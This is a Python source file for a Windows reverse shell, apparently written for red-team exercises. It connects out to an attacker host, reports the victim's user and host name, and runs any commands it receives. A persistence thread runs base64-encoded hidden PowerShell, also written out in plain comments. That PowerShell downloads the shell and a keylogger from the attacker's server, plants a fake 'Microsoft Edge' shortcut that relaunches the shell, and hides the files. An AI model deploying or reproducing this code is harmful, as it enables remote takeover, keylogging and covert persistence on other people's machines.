"""
To be used with meepcut
Has a persistence mechanism:
    - Constantly checks if meepcut (another persistence mechanism) is present
    - Constantly checks if meeplogger is present
    - Constantly marks all meep files as System & Hidden
This should be low-hanging fruit for Blue Teamers
"""

import socket
import subprocess
import time
import _thread


def perst():
    while True:
        # if (-not (Test-Path $env:TEMP\meepshell2.pyw)) {wget -o $env:TEMP\meepshell2.pyw http://{}:8080/meepshell2.pyw; if (-not (Test-Path $env:TEMP\meeploggerplus.pyw)) {wget -o $env:TEMP\meepsloggerplus.pyw http://{}:8082/meeploggerplus.pyw; attrib +s +h $env:TEMP\meep*}
        # if (-not (Test-Path C:\Users\Public\Desktop\'Microsoft Edge.lnk')) {$WShell = New-Object -comObject WScript.Shell; $Shortcut = $WShell.CreateShortcut("C:\Users\Public\Desktop\Microsoft Edge.lnk"); $Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"; $Shortcut.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,IDR_MAINFRAME"; $Shortcut.hotkey = "ctrl+a"; $Shortcut.Arguments = "-WindowStyle Hidden if (-not (Test-Path $env:TEMP\meepshell2.pyw)) {wget -o $env:TEMP\meepshell.pyw http://{}:8080/meepshell2.pyw}; try {Get-Process -Name pythonw -ErrorAction Stop} catch {pythonw.exe $env:TEMP\meepshell2.pyw};"; $Shortcut.WindowStyle = 7; $Shortcut.Save()}
        # attrib.exe +s +h $env:TEMP\meep*
        subprocess.getoutput('powershell -WindowStyle Hidden -encoded aQBmACAAKAAtAG4AbwB0ACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcABzAGgAZQBsAGwAMgAuAHAAeQB3ACkAKQAgAHsAdwBnAGUAdAAgAC0AbwAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcABzAGgAZQBsAGwAMgAuAHAAeQB3ACAAaAB0AHQAcAA6AC8ALwB7AH0AOgA4ADAAOAAwAC8AbQBlAGUAcABzAGgAZQBsAGwAMgAuAHAAeQB3ADsAIABpAGYAIAAoAC0AbgBvAHQAIAAoAFQAZQBzAHQALQBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGUAZQBwAGwAbwBnAGcAZQByAHAAbAB1AHMALgBwAHkAdwApACkAIAB7AHcAZwBlAHQAIAAtAG8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBsAG8AZwBnAGUAcgBwAGwAdQBzAC4AcAB5AHcAIABoAHQAdABwADoALwAvAHsAfQA6ADgAMAA4ADIALwBtAGUAZQBwAGwAbwBnAGcAZQByAHAAbAB1AHMALgBwAHkAdwA7ACAAYQB0AHQAcgBpAGIAIAArAHMAIAArAGgAIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAKgB9AA==')
        subprocess.getoutput('powershell -WindowStyle Hidden -encoded aQBmACAAKAAtAG4AbwB0ACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABlAHMAawB0AG8AcABcACcATQBpAGMAcgBvAHMAbwBmAHQAIABFAGQAZwBlAC4AbABuAGsAJwApACkAIAB7ACQAVwBTAGgAZQBsAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AYwBvAG0ATwBiAGoAZQBjAHQAIABXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsADsAIAAkAFMAaABvAHIAdABjAHUAdAAgAD0AIAAkAFcAUwBoAGUAbABsAC4AQwByAGUAYQB0AGUAUwBoAG8AcgB0AGMAdQB0ACgAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAZQBzAGsAdABvAHAAXABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUALgBsAG4AawAiACkAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AVABhAHIAZwBlAHQAUABhAHQAaAAgAD0AIAAiACUAUwB5AHMAdABlAG0AUgBvAG8AdAAlAFwAcwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAEkAYwBvAG4ATABvAGMAYQB0AGkAbwBuACAAPQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwARQBkAGcAZQBcAEEAcABwAGwAaQBjAGEAdABpAG8AbgBcAG0AcwBlAGQAZwBlAC4AZQB4AGUALABJAEQAUgBfAE0AQQBJAE4ARgBSAEEATQBFACIAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AaABvAHQAawBlAHkAIAA9ACAAIgBjAHQAcgBsACsAYQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAEEAcgBnAHUAbQBlAG4AdABzACAAPQAgACIALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAGkAZgAgACgALQBuAG8AdAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBoAGUAbABsADIALgBwAHkAdwApACkAIAB7AHcAZwBlAHQAIAAtAG8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBoAGUAbABsAC4AcAB5AHcAIABoAHQAdABwADoALwAvAHsAfQA6ADgAMAA4ADAALwBtAGUAZQBwAHMAaABlAGwAbAAyAC4AcAB5AHcAfQA7ACAAdAByAHkAIAB7AEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAHAAeQB0AGgAbwBuAHcAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAfQAgAGMAYQB0AGMAaAAgAHsAcAB5AHQAaABvAG4AdwAuAGUAeABlACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGUAZQBwAHMAaABlAGwAbAAyAC4AcAB5AHcAfQA7ACIAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AVwBpAG4AZABvAHcAUwB0AHkAbABlACAAPQAgADcAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AUwBhAHYAZQAoACkAfQA=')
        subprocess.getoutput('powershell -WindowStyle Hidden -encoded YQB0AHQAcgBpAGIALgBlAHgAZQAgACsAcwAgACsAaAAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcAAqAA==')


def main():
    _thread.start_new_thread(perst, ())
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            hostname = "" # set hostname/ip
            ip = socket.gethostbyname(hostname)
            port = 13616
            s.connect((ip, port))
            s.send("chad".encode())
            victimhost = subprocess.getoutput("whoami")
            victimhost += "@"
            victimhost += subprocess.getoutput("hostname")
            s.send(victimhost.encode())
            while True:
                command = s.recv(2048).decode()
                output = 'Output: \n'
                output += subprocess.getoutput(command)
                s.send(output.encode())
        except:
            pass
        time.sleep(60)


if __name__ == "__main__":
    main()
